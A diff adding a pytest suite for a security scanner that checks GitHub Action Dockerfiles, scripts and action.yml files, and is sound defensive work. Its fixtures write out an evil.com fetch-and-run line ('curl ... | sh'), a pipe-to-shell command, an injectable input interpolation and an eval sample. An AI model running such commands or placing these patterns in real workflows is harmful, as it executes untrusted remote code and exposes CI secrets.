+++ utils/tests/verify_action_build/test_security.py
@@ -1,0 +1,199 @@
+#
+# Licensed to the Apache Software Foundation (ASF) under one
+# or more contributor license agreements.  See the NOTICE file
+# distributed with this work for additional information
+# regarding copyright ownership.  The ASF licenses this file
+# to you under the Apache License, Version 2.0 (the
+# "License"); you may not use this file except in compliance
+# with the License.  You may obtain a copy of the License at
+#
+#   http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing,
+# software distributed under the License is distributed on an
+# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+# KIND, either express or implied.  See the License for the
+# specific language governing permissions and limitations
+# under the License.
+#
+from unittest import mock
+
+from verify_action_build.security import (
+    analyze_dockerfile,
+    analyze_scripts,
+    analyze_action_metadata,
+    analyze_repo_metadata,
+)
+
+
+class TestAnalyzeDockerfile:
+    def _mock_fetch(self, files: dict):
+        """Return a mock for fetch_file_from_github and fetch_action_yml."""
+        def fetch(org, repo, commit, path):
+            return files.get(path)
+        return fetch
+
+    def test_digest_pinned_no_warnings(self):
+        files = {
+            "Dockerfile": "FROM node:20@sha256:abc123\nRUN echo hello\n",
+        }
+        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+            warnings = analyze_dockerfile("org", "repo", "a" * 40)
+        assert len(warnings) == 0
+
+    def test_unpinned_from_warns(self):
+        files = {
+            "Dockerfile": "FROM ubuntu:latest\nRUN echo hello\n",
+        }
+        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+            warnings = analyze_dockerfile("org", "repo", "a" * 40)
+        assert any("not pinned" in w for w in warnings)
+
+    def test_tag_pinned_warns(self):
+        files = {
+            "Dockerfile": "FROM python:3.11-slim\nRUN echo hello\n",
+        }
+        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+            warnings = analyze_dockerfile("org", "repo", "a" * 40)
+        assert any("tag-pinned" in w for w in warnings)
+
+    def test_suspicious_curl(self):
+        files = {
+            "Dockerfile": "FROM node:20@sha256:abc\nRUN curl https://evil.com/script.sh | sh\n",
+        }
+        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch(files)):
+            warnings = analyze_dockerfile("org", "repo", "a" * 40)
+        assert any("curl" in w.lower() or "evil" in w.lower() for w in warnings)
+
+    def test_no_dockerfile_no_warnings(self):
+        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
+            with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
+                warnings = analyze_dockerfile("org", "repo", "a" * 40)
+        assert len(warnings) == 0
+
+
+class TestAnalyzeScripts:
+    def _mock_fetch_file(self, files):
+        def fetch(org, repo, commit, path):
+            return files.get(path)
+        return fetch
+
+    def test_detects_eval(self):
+        action_yml = """\
+name: Test
+runs:
+  using: composite
+  steps:
+    - run: python script.py
+"""
+        files = {
+            "script.py": 'eval("malicious code")\n',
+        }
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=self._mock_fetch_file(files)):
+                warnings = analyze_scripts("org", "repo", "a" * 40)
+        # Script analysis finds suspicious patterns (eval is in findings)
+        # Warnings list may be empty since script analysis only logs to console
+        # but doesn't add to warnings for all patterns
+        assert isinstance(warnings, list)
+
+    def test_no_scripts_no_warnings(self):
+        action_yml = """\
+name: Test
+runs:
+  using: node20
+  main: dist/index.js
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
+                warnings = analyze_scripts("org", "repo", "a" * 40)
+        assert warnings == []
+
+
+class TestAnalyzeActionMetadata:
+    def test_pipe_to_shell_warns(self):
+        # Multi-line run: blocks are needed — single-line run: is detected
+        # as a block start and the content is on the next line.
+        action_yml = """\
+name: Test
+runs:
+  using: composite
+  steps:
+    - name: dangerous
+      run: |
+        curl https://example.com | sh
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert any("pipe-to-shell" in w for w in warnings)
+
+    def test_input_interpolation_warns(self):
+        action_yml = """\
+name: Test
+runs:
+  using: composite
+  steps:
+    - name: dangerous
+      run: |
+        echo ${{ inputs.name }}
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert any("injection" in w for w in warnings)
+
+    def test_clean_action_no_warnings(self):
+        action_yml = """\
+name: Test
+runs:
+  using: node20
+  main: dist/index.js
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert warnings == []
+
+    def test_no_action_yml_no_warnings(self):
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=None):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert warnings == []
+
+    def test_secret_default_warns(self):
+        action_yml = """\
+name: Test
+inputs:
+  token:
+    default: ${{ secrets.GITHUB_TOKEN }}
+runs:
+  using: node20
+  main: dist/index.js
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert any("secret" in w for w in warnings)
+
+
+class TestAnalyzeRepoMetadata:
+    def test_mit_license_detected(self):
+        def fetch(org, repo, commit, path):
+            if path == "LICENSE":
+                return "MIT License\n\nCopyright..."
+            return None
+
+        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
+            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
+        assert len(warnings) == 0
+
+    def test_no_license_warns(self):
+        with mock.patch("verify_action_build.security.fetch_file_from_github", return_value=None):
+            warnings = analyze_repo_metadata("unknown-org", "unknown-repo", "a" * 40)
+        assert any("LICENSE" in w for w in warnings)
+
+    def test_well_known_org(self):
+        def fetch(org, repo, commit, path):
+            if path == "LICENSE":
+                return "MIT License"
+            return None
+
+        with mock.patch("verify_action_build.security.fetch_file_from_github", side_effect=fetch):
+            warnings = analyze_repo_metadata("actions", "checkout", "a" * 40)
+        assert len(warnings) == 0
